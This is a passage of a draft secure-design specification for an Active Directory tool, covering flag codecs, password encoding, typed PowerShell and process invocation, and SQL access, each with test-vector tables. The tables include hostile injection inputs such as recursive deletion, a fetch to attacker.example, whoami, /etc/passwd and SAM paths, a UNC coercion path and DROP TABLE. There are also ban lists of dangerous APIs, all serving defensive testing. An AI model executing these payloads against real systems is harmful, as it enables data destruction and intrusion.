  `reference/uac-flags.md`). `UACComputed` exposes exactly LOCKOUT (0x10) and PASSWORD_EXPIRED
  (0x800000), the only bits MS-ADTS defines for it on AD DS ([adts-uacc]).
- Unknown bits survive decode → encode. A write never drops bits we do not know.
- Writes are `Change{set, clear}` applied to the value read, producing `(old, new)` for a
  compare-and-swap delete+add (uac-flags.md). LOCKOUT, PASSWD_CANT_CHANGE and PASSWORD_EXPIRED are not
  settable; TRUSTED_FOR_DELEGATION and TRUSTED_TO_AUTH_FOR_DELEGATION need an explicit privileged
  capability.
- `GroupType.Scope()` requires exactly one of GLOBAL 0x2 / DOMAIN_LOCAL 0x4 / UNIVERSAL 0x8 (BUILTIN 0x1
  for builtin groups); SECURITY is 0x80000000. Filters render masks unsigned (§3.2).

| ID | Input | Expected | Why |
| --- | --- | --- | --- |
| FL-01 | UAC `512` | {NORMAL_ACCOUNT} | |
| FL-02 | UAC `514` | {NORMAL_ACCOUNT, ACCOUNTDISABLE} | |
| FL-03 | UAC `66048` | {NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD} | |
| FL-04 | UAC `532480` | {SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION} | a DC |
| FL-05 | UAC `268435968` (512 + 0x10000000, a bit absent from our flag table) | {NORMAL_ACCOUNT} + unknown 0x10000000; re-encodes to `268435968` | unknown bits preserved; newer Windows versions add bits |
| FL-06 | UAC `8389120` (512 + 0x800000) | no `PasswordExpired()` on `UAC` (compile-time); `UACComputed` `8388608` → PasswordExpired | stored bit is unreliable |
| FL-07 | `Change{set: LOCKOUT}` · `Change{clear: LOCKOUT}` | error `NotSettable` | unlock is `lockoutTime=0` |
| FL-08 | `Change{set: TRUSTED_FOR_DELEGATION}` without capability | error `PrivilegeRequired` | unconstrained delegation |
| FL-09 | groupType `-2147483646` · `-2147483640` · `-2147483644` · `2` | security global · security universal · security domain-local · distribution global | signed values (gotcha 23) |
| FL-10 | groupType `2147483650` | error `Overflow` | AD sends signed |
| FL-11 | groupType `-2147483638` (GLOBAL + UNIVERSAL) | decodes; `Scope()` → error `InvalidScope` | |
| FL-12 | `512 `, `+512`, `0x200`, `0512`, empty, `-0` | error `BadInteger` | |
| FL-13 | `4294967296` | error `Overflow` | |

### 5.6 `unicodePwd` and the `Secret` type

`Secret`: built from bytes (not a language string on GC runtimes, feasibility §2.5); formatting and
logging print `[REDACTED]`; serialisation (JSON, protobuf) fails; zeroised after use; constant-time
compare. Tier N (Rust) implements this type and nothing else of P3 unless it parses a codec's input.

Encode only (AD never returns the attribute). Value = UTF-16LE of `"` + password + `"`; the quotes are
not part of the password; admin reset = replace with one value; user change = delete old + add new in
one modify; the DC requires 128-bit TLS or (WS2003+) 128-bit SASL encryption
([MS-ADTS unicodePwd][adts-pwd]). `unicodePwd.Replace(s, conn: SecureConn)` and
`unicodePwd.Change(old, new, conn: SecureConn)`; `SecureConn` is obtainable only from a TLS or sealed
connection, so we fail before sending.

| ID | Input | Expected | Why |
| --- | --- | --- | --- |
| PW-01 | `Pa55word!` | `22 00 50 00 61 00 35 00 35 00 77 00 6f 00 72 00 64 00 21 00 22 00` | quoted UTF-16LE |
| PW-02 | `pässwörd` | `22 00 70 00 e4 00 73 00 73 00 77 00 f6 00 72 00 64 00 22 00` | not Latin-1, not UTF-8 |
| PW-03 | `p@ss😀` | `22 00 70 00 40 00 73 00 73 00 3d d8 00 de 22 00` | surrogate pair |
| PW-04 | `a"b` | `22 00 61 00 22 00 62 00 22 00` | DC sets `a"b` `[UNVERIFIED — Windows and Samba lab]` |
| PW-05 | bytes `ff fe 41` | error `InvalidUTF8` | U+FFFD would set a password nobody typed |
| PW-06 | bytes `ed a0 80` (lone surrogate) | error `InvalidUTF8` | |
| PW-07 | `a\x00b` | error `NulInSecret` | |
| PW-08 | empty | error `EmptySecret` | no PASSWD_NOTREQD workaround; empty-bind trap (gotcha 31) |
| PW-09 | 257 UTF-16 code units | error `TooLong` (cap provisional 256 `[UNVERIFIED vs Windows maximum]`) | R5 |
| PW-10 | `Replace(s, plain 389 connection)` | error `EncryptionRequired`; nothing sent | MS-ADTS requirement |
| PW-11 | format/log/wrap a `Secret` in an error | `[REDACTED]`; JSON/protobuf → error `Unserializable` | R7 |
| PW-12 | LDAP packet-debug logging on while the modify is built | impossible in production builds (lint); test asserts off | debug dumps carry the value |
| PW-13 | DC answers 19/53 with `0000052D` | error `PolicyViolation` with DC diagnostic; request bytes never logged | gotcha 34 |

**Lint.** The literal `"unicodePwd"`, UTF-16 encoders on secret material, and the LDAP library's
debug switch (go-ldap `Conn.Debug`) are banned outside `attr`/connector; `Secret` has no
string-conversion method to call.

## 6. P4 — Command invocation

**Invariant.** Code is fixed, reviewed and shipped; data is a typed value delivered out of band (an
API object or a stdin document). Data is never script text, never an argv element a shell or
PowerShell's parameter binder interprets, never an environment variable, file name or directory name.

Banned outright, every tier: `-Command`/`-c` or `-CommandWithArgs` with non-constant text;
`-EncodedCommand` (Base64 of UTF-16LE *script text* ([about_pwsh][pwsh]) — it hides quoting from the
outer shell, the decoded text is still code); `Invoke-Expression`, `[ScriptBlock]::Create`,
`ExpandString`; `AddScript` on non-constant text; `cmd.exe`, `.bat`, `.cmd` (Windows programs parse
their command lines differently, BatBadBut, [Flatt][batbadbut]); `sh -c`; data in `Start-Process -ArgumentList`.

Why argv is not a safe data channel even without a shell: `pwsh -File x.ps1 <args>` passes the rest of
the line as script parameters ([about_pwsh][pwsh]); PowerShell treats U+2013–U+2015 as dashes
([language spec §2.2.3][ps-lex]) so a value `–Credential` can bind as a parameter; and with "Include
command line in process creation events" on, every argv lands in Security event 4688, readable by
anyone with event-log access ([command-line auditing][ms-4688]).

### 6.1 `psx` — typed PowerShell operations (tier X sidecar)

Go never builds PowerShell. It calls `psx.Invoke(op, request)`; `op` is an enum generated from the
sidecar manifest, `request` a typed message. The sidecar (.NET + PowerShell SDK) maps each op to one
fixed pipeline: `AddCommand(<constant>)` and `AddParameter(<constant name>, <typed value>)`
([SMA AddCommand][sma]). The sidecar is launched by `proc` (§6.3) with constant argv; the request is a
length-prefixed message on stdin, the response on stdout; stderr is diagnostics only.

```
psx.Invoke(ctx, op: Op, req: OpRequest) -> OpResponse | Error           // Go side
Ops[Op.GetMailbox] = (r, ps) => ps.AddCommand("Get-EXOMailbox")
                                  .AddParameter("Identity", r.MailboxGuid /* Guid */)   // C# side
```

Sidecar rules:
1. Command and parameter names are compile-time constants per op; values are typed (.NET `string`,
   `int`, `bool`, `Guid`, `SecureString` from `Secret`, enums, arrays of these).
2. **`AddParameter` does not make query-language parameters safe.** The AD module's `-Filter` is the
   "PowerShell Expression Language" ([Get-ADUser][get-aduser]); Exchange `-Filter`/`-RecipientFilter`
   are OPATH; `-FilterScript`/`-ScriptBlock` are code. These take data only from a dedicated builder:
   `-LDAPFilter` only from P1's `FilterString`; OPATH and script-block parameters are banned for data
   until a primitive exists.
3. **`-Identity` takes a `Guid`, never a user string.** AD cmdlets resolve an `-Identity` string as a
   DN, GUID, SID or sAMAccountName ([Get-ADUser][get-aduser]); an attacker-chosen string can resolve to
   a different object.
4. Runspace from `InitialSessionState.CreateDefault2()` with only the op's modules, imported by full
   path and pinned version. Run it in `NoLanguage` ("only native commands and cmdlets",
   [language modes][ps-langmodes]) if the modules work there — `[UNVERIFIED]` for ExchangeOnlineManagement;
   decide in the sidecar spike.
5. Output is typed response fields, never formatted text. Secrets never reach output, errors or
   logs; script block logging (4104) and transcription can be forced on by GPO ([about_Logging_Windows][ps-logging]).

**Route B (only by ADR):** a static, signed `.ps1` run with `pwsh -NoProfile -NonInteractive -File`
and parameters as JSON on stdin (feasibility §2.7). ADR-0001 as proposed forbids shipped `.ps1` outside
`lab/`/`tools/` (rule 1, F1), so route B needs an amendment; the PSX vectors apply to it unchanged.

| ID | Value sent through the test-only `Echo` op | Expected | Why |
| --- | --- | --- | --- |
| PSX-01 | `O’Brien` (U+2019) | arrives byte-identical | curly quote |
| PSX-02 | `x‘; Remove-Item -Recurse C:\; ‘` (U+2018) | verbatim; nothing runs | PatchIQ class |
| PSX-03 | `'; Stop-Computer; '` | verbatim | ASCII quote |
| PSX-04 | `$(Invoke-WebRequest https://attacker.example)` | verbatim, no expansion | subexpression |
| PSX-05 | `` `$env:PATH `` · `“$(calc)”` (U+201C/D) | verbatim | backtick, curly double quotes |
| PSX-06 | `–Credential` (U+2013) · `—Force` (U+2014) · `-Confirm:$false` | bound as the *value* of the named parameter | dash forms |
| PSX-07 | `a\n# comment\nb` | verbatim | newline + comment |
| PSX-08 | `a\x00b` | error `NulInString` before the sidecar | R3 |
| PSX-09 | 1 MiB where the schema allows 1 KiB | error `TooLong` | R5 |
| PSX-10 | unknown op or parameter forged at the sidecar | error `UnknownOp`; nothing runs | enum on the Go side |
| PSX-11 | string for a `-Filter`/OPATH/script-block parameter | error `QueryParameterRequiresBuilder` | rule 2 |
| PSX-12 | `-Identity` string `S-1-5-32-544` | error `IdentityRequiresGUID` | rule 3 |
| PSX-13 | secret `P’ss"word$(x)` | arrives as `SecureString`; absent from argv/4688, stdout, stderr, logs and 4104 (Windows lab) | R7 |
| PSX-14 | sidecar prints a banner before the response | error `ResponseFramingError`, not partial success | strict framing |

**Lint.** Tier X BannedApiAnalyzers ([RS0030][banned-api]): `PowerShell.AddScript(*)`,
`ScriptBlock.Create`, `CommandInvocationIntrinsics.ExpandString`/`InvokeScript`,
`ProcessStartInfo.Arguments`, `Process.Start(string, string)`. Go: `exec.Command*` outside `proc`;
literals `powershell`, `pwsh`, `cmd.exe`, `-Command`, `-EncodedCommand` outside `psx`/`proc`; gosec G204.
`lab/` and `tools/` PowerShell: PSScriptAnalyzer `PSAvoidUsingInvokeExpression` ([rule][psa-iex]) plus a
custom rule against expandable strings fed to `-Command`/`Invoke-Expression`.

### 6.2 `pslit` — PowerShell single-quoted literal (display and build-time generation only)

Uses: the console's "PowerShell equivalent" panel (an admin copies a command to run themselves),
generated documentation, `lab/` and `tools/`. The output type `DisplayOnlyPowerShell` has no path to
any interpreter we run.

**Algorithm.** Reject NUL and invalid UTF-8/UTF-16. For each character: if it is U+0027, U+2018,
U+2019, U+201A or U+201B, emit it **twice**; otherwise emit it. Wrap in ASCII `'…'`. Never use
double-quoted strings, here-strings, backtick escapes or `-f` to build code.

**Why this is exact.** The language defines *single-quote-character* as exactly those five code points
and escapes one inside a verbatim string by doubling ([language spec §2.3.5.2][ps-lex]). The tokenizer
treats a quote followed by *any* single-quote character as an escaped pair and keeps the second
(PowerShell `tokenizer.cs` `ScanStringLiteral`, `CharTraits.cs` `IsSingleQuote`, [source][ps-src]).
Doubling each character with itself therefore preserves it exactly; replacing `’` by `''` would
change the data to `'`. Microsoft's `CodeGeneration.EscapeSingleQuotedStringContent` is documented
to escape single quotes ([API][ps-escape]); whether it covers U+2018–U+201B is `[UNVERIFIED]` — these
vectors are the contract either way.

| ID | Input | Expected output | Why |
| --- | --- | --- | --- |
| PSQ-01 | `O'Brien` | `'O''Brien'` | ASCII |
| PSQ-02 | `O‘Brien` (U+2018) | `'O‘‘Brien'` | AC 3 |
| PSQ-03 | `O’Brien` (U+2019) | `'O’’Brien'` | AC 3 |
| PSQ-04 | `O‚Brien` (U+201A) | `'O‚‚Brien'` | AC 3 |
| PSQ-05 | `O‛Brien` (U+201B) | `'O‛‛Brien'` | AC 3 |
| PSQ-06 | `a’; Start-Process calc; ’` | `'a’’; Start-Process calc; ’’'` | PatchIQ's ASCII-only escaper gave `'a’; Start-Process calc; ’'`: the string ends at the first `’` and `calc` runs |
| PSQ-07 | `abc’` | `'abc’’'` | ASCII-only gives `'abc’'`, where `’'` is an escaped pair and the literal swallows following code |
| PSQ-08 | `'’` | `'''’’'` | mixed |
| PSQ-09 | `‘’‚‛'` (all five) | `'‘‘’’‚‚‛‛'''` | every member of the set |
| PSQ-10 | `$(calc)` | `'$(calc)'` | no expansion in verbatim strings |
| PSQ-11 | `` a`'b `` | `` 'a`''b' `` | backtick is literal; quote still doubled |
| PSQ-12 | `“x”` (U+201C/D) | `'“x”'` | double quotes inert here |
| PSQ-13 | `–Force` (U+2013) | `'–Force'` | quoted, so never a parameter |
| PSQ-14 | `ʼ` (U+02BC) · `＇` (U+FF07) | unchanged | not quote characters; the set is exactly five |
| PSQ-15 | `a\r\nb` | `'a\r\nb'` | verbatim strings may span lines |
| PSQ-16 | empty | `''` | |
| PSQ-17 | `a\x00b` · lone surrogate | error `NulInString` · `InvalidUTF16` | R3 |

**Oracle (FF-SP6).** CI parses every output with
`[System.Management.Automation.Language.Parser]::ParseInput` (pwsh on Linux): zero errors, exactly one
`StringConstantExpressionAst`, `Value -ceq` input. Windows PowerShell 5.1 is checked on the Windows
runner (same lexical rules, language spec 3.0).

**Lint.** Single-quote doubling outside `pslit` — e.g. `Replace("'", "''")`, `strings.ReplaceAll(s, "'", "''")`,
`-replace "'", "''"` — fails the build (literal-shape scanner); it is exactly the PatchIQ bug.

### 6.3 `proc` — native process invocation

```
proc.Run(ctx, bin: BinaryID, args: [Arg], opts) -> Result
BinaryID  // manifest enum -> absolute path fixed at install; never PATH, never the working directory
Arg       // Flag(constant) | Value(GUID | Hostname | Port | EnumToken | ManagedPath) — no free text
opts      // stdin bytes (the data channel), env allowlist, private temp cwd, timeout, output cap
```

Argv arrays only, no shell. .NET uses `ProcessStartInfo.ArgumentList`, never `Arguments`
([ArgumentList][argumentlist]); Go resolves absolute paths, avoiding `exec.ErrDot`
([os/exec][go-exec]). Values starting with `-`, `/` or U+2013–U+2015 are rejected unless the tool
honours `--` and the runner inserts it. UNC paths are rejected (NTLM coercion, feasibility §2.7). The
32,767-character Windows command-line limit ([CreateProcessW][createprocess]) is checked before launch.
The environment is an allowlist; secrets travel on stdin only.

| ID | Input | Expected | Why |
| --- | --- | --- | --- |
| PROC-01 | Hostname `dc01 & calc` | error `InvalidHostname` | and no shell would see it anyway |
| PROC-02 | `"; calc; "` | error `InvalidValue` | quote breakout |
| PROC-03 | `\| whoami` · `$(id)` · `` `id` `` | error `InvalidValue` | pipes, substitution |
| PROC-04 | `%COMSPEC%` · `$PATH` | error `InvalidValue`; no expansion happens | env expansion |
| PROC-05 | `^& calc` | error `InvalidValue` | cmd escape |
| PROC-06 | `-o/etc/passwd` · `/s` · `–x` (U+2013) | error `OptionInjection` | option injection |
| PROC-07 | `\\attacker.example\share\x` | error `UNCPathRejected` | NTLM coercion |
| PROC-08 | `..\..\Windows\System32\config\SAM` | error `PathTraversal` | managed root only |
| PROC-09 | `a\nb` · `a\x00b` | error `ControlCharRejected` | |
| PROC-10 | a manifest entry pointing at `cmd.exe`, `*.bat`, `*.cmd`, or `pwsh` outside `psx` | manifest validation fails the build; runner refuses by extension too | BatBadBut |
| PROC-11 | `a\\"b` (backslashes before a quote) | probe binary echoes argv as JSON equal to the input | CommandLineToArgvW edge, runtime escaping verified |
| PROC-12 | total command line > 32 767 chars | error `CommandLineTooLong` before launch | |
| PROC-13 | parent env holds `DB_PASSWORD` | absent in the child | env allowlist |

**Lint.** Process APIs (`os/exec`, `Process.Start`, Rust `std::process::Command`) only in `proc`
(FF-SP1); gosec G204; tier N bans process creation outright (clippy `disallowed_methods`,
[clippy][clippy-dm]) — nothing in LSASS or LogonUI starts a process.

## 7. P5 — SQL access

Bound to ADR-0001 as proposed: PostgreSQL, pgx v5, sqlc; ORMs and raw-string query builders prohibited.
Rules:

1. Static queries are sqlc-generated; every value is a bind parameter.
2. Tenant context: `SELECT set_config('app.tenant_id', $1, true)` as the first statement of each
   transaction — `is_local = true` scopes it to the transaction ([set_config][pg-setconfig]). Never
   `SET`/`SET LOCAL` with a literal, never `is_local = false` (session settings leak across pooled
   connections — PatchIQ NC1/NC2). Every tenant table has RLS **and** `FORCE ROW LEVEL SECURITY`; the
   app role is not the owner and lacks `BYPASSRLS` ([RLS][pg-rls]).
3. Dynamic SQL exists in one place, the report compiler: an AST compiled to text + args; identifiers
   only from a static registry of pre-quoted identifiers (pgx `Identifier.Sanitize` at registry build,
   [pgx][pgx-ident]); operators and sort directions are enums; LIMIT/OFFSET bound. Security-architect
   reviews every change to it.
4. LIKE/ILIKE: user text goes through `LikePattern.Contains/Prefix(s)`, which escapes `\`, `%`, `_`;
   SQL is `LIKE $1 ESCAPE '\'` ([pattern matching][pg-like]).
5. Lists: `= ANY($1)` with an array parameter, capped.
6. pgx's simple-protocol mode is banned: it interpolates client-side (CVE-2024-27289, SQL injection via
   a minus before a placeholder, [GHSA-m7wr-2xf7-cm9p][pgx-cve]).
7. Invalid UTF-8 and NUL are rejected before SQL (PostgreSQL cannot store NUL in text,
   [character types][pg-char]); errors never carry SQL text or parameter values.
8. PL/pgSQL `EXECUTE` only with `format('%I'/'%L', …)` or `USING` ([format][pg-format]); `||` into
   `EXECUTE` is banned.

| ID | Input | Expected | Why |
| --- | --- | --- | --- |
| SQL-01 | value `' OR '1'='1` | bound; zero rows | tautology |
| SQL-02 | `'; DROP TABLE audit_events; --` | bound; table intact | stacked query |
| SQL-03 | tenant id `x'; SET ROLE postgres; --` | UUID parse error before SQL | PatchIQ NC1 shape |
| SQL-04 | sort key `name; DELETE FROM users` | error `UnknownColumn` | registry only |
| SQL-05 | sort key `"name"` · `Name` · `name ` | error `UnknownColumn` | exact keys |
| SQL-06 | direction `ASC; --` | error `BadSortDirection` | enum |
| SQL-07 | contains `%` | pattern `%\%%`; matches only a literal `%` | wildcard escape |
| SQL-08 | contains `_` | pattern `%\_%` | PatchIQ NC5: unescaped patterns over-match |
| SQL-09 | contains `\` | pattern `%\\%` | escape char itself |
| SQL-10 | text with NUL | error `NulInText` (400) | rule 7 |
| SQL-11 | invalid UTF-8 | error `InvalidUTF8` | rule 7 |
| SQL-12 | `$1`, `$$x$$`, `E'\x00'` as values | inert, bound | quoting tricks |
| SQL-13 | tenant A reads tenant B's object id | zero rows | RLS |
| SQL-14 | after commit, same pooled connection: `current_setting('app.tenant_id', true)` | empty | no session leak (NC2) |
| SQL-15 | `ANY($1)` with 100 001 elements | error `TooManyValues` | R5 |
| SQL-16 | report filter on JSON key `a'->>'b` | key bound as `->> $n` | JSON path |

**Lint.** gosec G201/G202 ([gosec][gosec]); forbidigo: `Exec/Query/QueryRow` whose SQL argument is not
a constant or sqlc-generated; `QueryExecModeSimpleProtocol`; `set_config(…, false)`; `SET app.`
literals; the SQL driver imported only by `store` (FF-SP1). FF-SP7 checks RLS + FORCE on every tenant
table and runs SQL-13/14.

## 8. Corpus and fitness functions

**Corpus.** One JSON Lines file per primitive (provisional root `testdata/safe-primitives/`; T-0004
fixes it):

```json
{"id":"LF-01","primitive":"ldapfilter","call":"Eq","args":{"attr":"cn","value":{"utf8":"*)(uid=*"}},
 "expect":{"render":"(cn=\\2a\\29\\28uid=\\2a)"},"hostile":true,"source":"RFC 4515 §3","verified":"doc"}
```

Inputs JSON cannot carry (invalid UTF-8, lone surrogates, NUL) use `{"hex":"…"}`. `expect` is one of
`render`, `bytes_hex`, `value` or `error`. `verified` is `doc`, `samba`, `windows` or `samba+windows`
and is updated by the lab tests, not by hand.

| FF | Check | Fails when |
| --- | --- | --- |
| FF-SP1 | Import boundaries | the LDAP library outside the connector; SQL driver outside `store`; process APIs outside `proc`; the PowerShell SDK outside the sidecar host (depguard / BannedApiAnalyzers / clippy) |
| FF-SP2 | Banned APIs | any symbol in the per-primitive lists in §3.5, §4.6, §5, §6, §7 |
| FF-SP3 | Literal-shape scanner | filter-, DN-, PowerShell- or SQL-shaped literals combined with concatenation or formatting outside primitive packages and tests (Semgrep or ast-grep; tool chosen by devops-engineer via the licence register) |
| FF-SP4 | Corpus gate | a primitive has < 10 `hostile` records; an implementation skips records for a primitive it implements; a record disappears without a superseding one |
| FF-SP5 | Fuzz | each parser/encoder lacks a corpus-seeded fuzz target; nightly ≥ 10 min each; properties `parse(render(x)) == x` and "render never emits an unescaped special" |
| FF-SP6 | Oracles | PowerShell parser oracle (`pslit`); LDAP library round-trip (P1); Windows `ConvertStringSidToSidW`/`StringFromGUID2` (SID, GUID) on the Windows runner; Samba lab integration (P1–P3); Windows lab nightly for the rows in §9 marked Windows |
| FF-SP7 | Tenancy | a tenant table lacks RLS + FORCE; SQL-13 or SQL-14 fails |
| FF-SP8 | Constant argv | for random requests, `psx`/`proc` argv differs from the manifest's constant argv |

## 9. Verification status and Samba false-pass risks

Nothing in this document is lab-verified yet (lab: T-0012). Status today: **documentation only**,
except the PowerShell quoting rules, which are confirmed in PowerShell's source code.

| Behaviour | Source | Must be verified on | Samba false-pass risk |
| --- | --- | --- | --- |
| Non-ASCII byte escapes and `/`→`\2f` in filters | RFC 4515, Microsoft | Samba + Windows | low |
| Unsigned decimal masks on signed `groupType` | Microsoft | Samba + Windows | low |
| No wildcard on DN-syntax attributes | `[UNVERIFIED]` | Samba + Windows | **medium** — behaviour may differ |
| `<GUID=hex>`/`<SID=hex>` in requests; extended DN refused | MS-ADTS | Samba + Windows | medium |
| Multi-valued RDN → `invalidDNSyntax` | MS-ADTS | Samba + Windows | medium |
| DN hex escapes `\3D \2F \0A` accepted; DN output form | Microsoft | Samba + Windows | **high for golden strings** — capture per platform, compare normalised |
| Name equality ignores width, kana, accents (José/Jose) | MS-ADTS | **Windows** | **high** — Samba's comparison differs `[UNVERIFIED]`; uniqueness tests must run on Windows |
| `unicodePwd` quoted UTF-16LE; encryption required; embedded `"` | MS-ADTS; PW-04 `[UNVERIFIED]` | Samba + Windows | medium — diagnostics differ (gotcha 52) |
| `accountExpires`/`pwdLastSet` sentinels | Microsoft | Samba + Windows | low |
| lockoutDuration 0/−2^63 forever; maxPwdAge −2^63 never | MS-ADTS formula | **Windows** | medium — Samba's computed-attribute support `[UNVERIFIED]` |
| Generalized Time `.0Z` output | RFC 4517; observed | Samba + Windows | low |
| 4688 and 4104 contain no operation data | Microsoft | **Windows only** | **high** — no Security log on Samba/Linux |
| Sidecar `NoLanguage` with required modules | `[UNVERIFIED]` | Windows + Linux sidecar | n/a |

## 10. What changes when ADR-0001 is ratified

| Topic | Fixed here (stack-agnostic) | If ratified as proposed (Go S/A, Rust N, .NET sidecar X, PostgreSQL) | If the ADR changes |
| --- | --- | --- | --- |
| Filters | AST, canonical renderer, parser rules, LF vectors | Go `ldapfilter`; renders a string because go-ldap's search request takes one; round-trip oracle via go-ldap's parser | .NET server: same renderer feeding S.DS.P; `DirectorySearcher` banned |
| DNs | grammar, rendering, AD rules, DN vectors | Go `dn`; may wrap `ldap.ParseDN` for grammar, adds AD rules | same contract in the chosen language |
| Codecs | sentinels, grammars, vectors | Go `attr`; Rust tier N implements `Secret` and any codec it parses, running the same corpus | each tier that decodes AD values runs the corpus |
| PowerShell | invariant, PSX/PSQ vectors | route A: tier-X sidecar with `AddCommand`/`AddParameter`; route B needs an ADR amendment (F1 bans shipped `.ps1`) | .NET server: in-process SMA under the same rules |
| Processes | `proc` contract, PROC vectors | Go `proc` + `x/sys/windows`; `ArgumentList` inside the sidecar | — |
| SQL | rules 1–8, SQL vectors | pgx v5 + sqlc + RLS; simple protocol banned | SQL Server would need its own section (RLS semantics differ) |
| Lint tools | rule meaning, FF-SP1–8 | golangci-lint (forbidigo, depguard, gosec), BannedApiAnalyzers, clippy, PSScriptAnalyzer for `lab/`/`tools/` | equivalents per language |
| Paths | provisional names above | T-0004 sets the roots; `ad-engineering` skill paths updated with them | — |

On ratification, the owner of the first primitives build ticket replaces the provisional names, and
this document moves `draft` → `review`. It becomes the reference for the build tickets the
project-manager cuts from it.

## 11. Follow-ups

- T-0028 — typed security-descriptor primitive (CLAUDE.md rule 5 names it; not in this ticket's scope).
- T-0029 — output encoders (CSV/XLSX formula neutralisation, HTML, email/PDF).
- OPATH (Exchange) filter primitive: none planned. OPATH parameters stay banned for data (§6.1 rule 2)
  until the M365 parity scope needs one.

## Sources

[rfc4515]: https://www.rfc-editor.org/rfc/rfc4515#section-3
[rfc4514]: https://www.rfc-editor.org/rfc/rfc4514#section-2.4
[rfc4517-int]: https://www.rfc-editor.org/rfc/rfc4517#section-3.3.16
[rfc4517-gt]: https://www.rfc-editor.org/rfc/rfc4517#section-3.3.13
[ms-filter]: https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax
[ms-dn]: https://learn.microsoft.com/en-us/previous-versions/windows/desktop/ldap/distinguished-names
[adspath]: https://learn.microsoft.com/en-us/windows/win32/adsi/ldap-adspath
[adts-altdn]: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/92a54869-38d7-4e71-a3be-5f67a0dcdd7e
[adts-mvrdn]: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/3c96b56d-d7a7-46f1-9883-7d031f9fa01e
[adts-sort]: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/dbb175fb-40f3-42a4-9257-4fc02a6fa943
[adts-uacc]: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/b80798ae-1f8c-4d30-9d80-a1f3281e96e2
[adts-pwd]: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/6e803168-f140-4d23-b2d3-c3a8ab5917d2
[dtyp-guid]: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/4926e530-816e-41c2-b251-ec5c7aca018a
[dtyp-sid-bin]: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/f992ad60-0fe4-4b87-9fed-beb478836861
[dtyp-sid-str]: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/c92a27b1-c772-4fa7-a432-15df5f1b66a1
[a-acctexp]: https://learn.microsoft.com/en-us/windows/win32/adschema/a-accountexpires
[a-cn]: https://learn.microsoft.com/en-us/windows/win32/adschema/a-cn
[searchflags]: https://learn.microsoft.com/en-us/windows/win32/adschema/a-searchflags
[systemflags]: https://learn.microsoft.com/en-us/windows/win32/adschema/a-systemflags
[samba-10512]: https://bugzilla.samba.org/show_bug.cgi?id=10512
[pwsh]: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_pwsh
[ps-lex]: https://learn.microsoft.com/en-us/powershell/scripting/lang-spec/chapter-02
[ps-src]: https://github.com/PowerShell/PowerShell/blob/master/src/System.Management.Automation/engine/parser/tokenizer.cs
[ps-escape]: https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.language.codegeneration.escapesinglequotedstringcontent
[ps-langmodes]: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes
[ps-logging]: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows
[sma]: https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.powershell.addcommand
[get-aduser]: https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-aduser
[ms-4688]: https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing
[batbadbut]: https://flatt.tech/research/posts/batbadbut-you-cant-securely-execute-commands-on-windows/
[argumentlist]: https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.argumentlist
[go-exec]: https://pkg.go.dev/os/exec#hdr-Executables_in_the_current_directory
[createprocess]: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw
[banned-api]: https://github.com/dotnet/roslyn-analyzers/blob/main/src/Microsoft.CodeAnalysis.BannedApiAnalyzers/BannedApiAnalyzers.Help.md
[psa-iex]: https://learn.microsoft.com/en-us/powershell/utility-modules/psscriptanalyzer/rules/avoidusinginvokeexpression
[clippy-dm]: https://rust-lang.github.io/rust-clippy/master/index.html#disallowed_methods
[gosec]: https://github.com/securego/gosec#available-rules
[pg-setconfig]: https://www.postgresql.org/docs/current/functions-admin.html#FUNCTIONS-ADMIN-SET
[pg-rls]: https://www.postgresql.org/docs/current/ddl-rowsecurity.html
[pg-like]: https://www.postgresql.org/docs/current/functions-matching.html#FUNCTIONS-LIKE
[pg-format]: https://www.postgresql.org/docs/current/functions-string.html#FUNCTIONS-STRING-FORMAT
[pg-char]: https://www.postgresql.org/docs/current/datatype-character.html
[pgx-ident]: https://pkg.go.dev/github.com/jackc/pgx/v5#Identifier.Sanitize
[pgx-cve]: https://github.com/advisories/GHSA-m7wr-2xf7-cm9p

Reference-style links above render inline wherever cited. Internal sources: `ad-technical-feasibility.md`
§2.2, §2.5, §2.7; `.claude/skills/ad-engineering/` (gotchas, `reference/attributes.md`,
`reference/uac-flags.md`); ADR-0001 (proposed); PatchIQ postmortem §11.
